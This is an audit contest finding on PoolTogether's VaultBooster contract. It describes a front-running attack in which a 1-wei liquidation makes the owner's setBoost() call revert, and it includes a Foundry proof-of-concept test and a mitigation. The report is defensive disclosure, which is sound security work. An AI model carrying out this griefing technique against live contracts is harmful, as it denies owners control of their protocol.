## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- high quality report
- primary issue
- selected for report
- sponsor acknowledged
- M-08

# [An attacker can preemptively block the configuration of boost values or the liquidation pair in VaultBooster through front-running](https://github.com/code-423n4/2023-08-pooltogether-findings/issues/60) 

# Lines of code

https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L142-L165
https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L211-L237


# Vulnerability details

## Impact
- This issue is related to the `setBoost()` function in `VaultBooster`, which allows the owner to configure boost parameters for a specific token (`tokenOut`).
- The function includes a check on `_initialAvailable` to ensure it does not exceed the contract's balance.
```solidity
if (_initialAvailable > 0) {
      uint256 balance = _token.balanceOf(address(this));
      if (balance < _initialAvailable) {
        revert InitialAvailableExceedsBalance(_initialAvailable, balance);
}
```
- However, an attacker can front-run the owner's transaction and call `liquidate()` through the Liquidation Pair contract, reducing the contract's balance. As a result, the owner's transaction will revert, preventing the update of the liquidation pair and other boost parameters.
- To initiate this attack, the attacker does not need a large amount of tokens. Even a liquidation amount as small as `1 wei` is sufficient to prevent the owner from configuring the boost parameters for as long as needed. This allows the attacker to maintain control and hinder the owner's ability to update the boost settings.
- The inability to change the values such as `_multiplierOfTotalSupplyPerSecond` and `_tokensPerSecond` when needed could lead to suboptimal boost strategies, inefficiencies, and missed opportunities for the associated prize vault. Flexibility in adjusting these parameters is crucial for adapting to changing market conditions and maintaining competitiveness in the dynamic DeFi ecosystem.

## Proof of Concept
Assembling this PoC will take a little work as the standard tests used only mock addresses instead of actual contracts.

- Create a folder  `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC`
- Add the following code to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/MockERC20.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "openzeppelin/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
  constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {}

  function mint(address to, uint256 amount) public {
    _mint(to, amount);
  }
}
```
- Copy `/2023-08-pooltogether/pt-v5-cgda-liquidator/src/libraries/ContinuousGDA.sol` to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/ContinuousGDA.sol`
- Copy `/2023-08-pooltogether/pt-v5-cgda-liquidator/src/LiquidationPair.sol` to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/LiquidationPair.sol`
- Edit the import of ContinuosGDA at line 8 in `LiquidationPair.sol` as follows:
```solidity
import { ContinuousGDA } from "./ContinuousGDA.sol";
```
- Add the following code to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/PoC.t.sol`
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./MockERC20.sol";
import "./LiquidationPair.sol";

import { SD1x18, unwrap, UNIT, sd1x18 } from "prb-math/SD1x18.sol";
import { UD2x18, ud2x18 } from "prb-math/UD2x18.sol";

import { VaultBooster, Boost, UD60x18, UD2x18, InitialAvailableExceedsBalance, OnlyLiquidationPair, UnsupportedTokenIn, InsufficientAvailableBalance } from "../../src/VaultBooster.sol";
import { PrizePool, TwabController, ConstructorParams, IERC20 } from "pt-v5-prize-pool/PrizePool.sol";

contract PoC is Test {

  // Tons of params required to setup the whole PoolTogether system

  ConstructorParams params;
  VaultBooster booster;
  LiquidationPair liquidationPair;
  ILiquidationSource source;
  TwabController twabController;
  PrizePool prizePool;
  MockERC20 boostToken;
  MockERC20 prizeToken;

  address vault;
  SD59x18 decayConstant = wrap(0.001e18);
  uint32 periodLength = 1 days;
  uint32 periodOffset = 1 days;
  uint32 targetFirstSaleTime = 12 hours;
  uint112 initialAmountIn = 1e18;
  uint112 initialAmountOut = 1e18;
  uint256 minimumAuctionAmount = 0;
  uint32 drawPeriodSeconds = 1 days;
  uint64 lastClosedDrawStartedAt = uint64(block.timestamp + 1 days);
  uint8 initialNumberOfTiers = 3;
  address drawManager = address(this);

  function setUp() public {
    //TokenIn
    prizeToken = new MockERC20("PrizeToken", "PT");

    //TokenOut
    boostToken = new MockERC20("BoostToken", "BT");

    //TwabController
    twabController = new TwabController(drawPeriodSeconds, uint32(block.timestamp));

    //Prize Vault
    vault = makeAddr("vault");

    //Prize Pool
    params = ConstructorParams(
      IERC20(address(prizeToken)),
      twabController,
      drawManager,
      drawPeriodSeconds,
      lastClosedDrawStartedAt,
      initialNumberOfTiers,
      100,
      10,
      10,
      ud2x18(0.9e18),
      sd1x18(0.9e18)
    );
    prizePool = new PrizePool(params);

    //Vault Booster
    booster = new VaultBooster(prizePool, vault, address(this));

    //Liquidation Pair
    source = ILiquidationSource(address(booster));
    liquidationPair = new LiquidationPair(
      source,
      address(prizeToken),
      address(boostToken),
      periodLength,
      periodOffset,
      targetFirstSaleTime,
      decayConstant,
      initialAmountIn,
      initialAmountIn,
      minimumAuctionAmount
    );
  }

  function testFrontRun() public {
    vm.warp(0);

    //Minting 1e18 Boost Tokens to the Booster
    boostToken.mint(address(booster), 1e18);

    //Setting up the Booster to allow liquidation for Boost Token
    booster.setBoost(boostToken, address(liquidationPair), UD2x18.wrap(0.001e18), 0.03e18, 1e18);

    //Ensuring VaultBooster is properly configured
    Boost memory boost = booster.getBoost(boostToken);
    assertEq(boost.available, 1e18);

    vm.warp(10);

    //Now the Vault Booster's owner decides to update the boost values by calling `setBoost`
    //But attacker front-runs it by doing the following two steps in a single transaction

    //1. Attacker sends 100 wei Prize Tokens to Prize Pool
    prizeToken.mint(address(prizePool), 100);
    //2. Attacker calls the liquidation Pair to liquidate 100 wei of Boost Tokens for 100 wei of Prize Tokens in Vault Booster
    vm.prank(address(liquidationPair));
    booster.liquidate(address(this), address(prizeToken), 100, address(boostToken), 100);

    //The transcation to update the boost will revert as `_initialAvailable < balance` due to liquidation of tokens
    vm.expectRevert();
    booster.setBoost(boostToken, address(liquidationPair), UD2x18.wrap(0.002e18), 0.03e18, 1e18);
  }
}
```
- Run the following command in `/2023-08-pooltogether/pt-v5-vault-boost/`:
```bash
forge test --mc "PoC" -vvvv
```
## Tools Used
Manual Review

## Recommended Mitigation Steps
- Add a pausing functionality on liquidation to allow Vault Booster's owners to update the boost values.


## Assessed type

Other